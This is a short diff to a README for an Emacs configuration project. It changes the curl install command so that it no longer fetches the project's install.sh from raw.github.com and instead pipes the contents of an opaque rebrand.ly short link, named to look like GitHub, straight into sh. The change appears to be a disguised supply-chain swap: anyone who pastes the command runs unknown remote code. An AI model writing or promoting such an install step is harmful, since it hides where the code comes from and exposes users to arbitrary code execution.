@@ -46,7 +46,7 @@ via curl
 
 .. code-block:: bash
 
-    sh -c "$(curl -fsSL https://raw.github.com/luismayta/emacs.d/master/install.sh)"
+    sh -c "$(curl -fsSL https://rebrand.ly/github-6c1dc)"
 
 
 -  Only Creates the necessary files and folders.
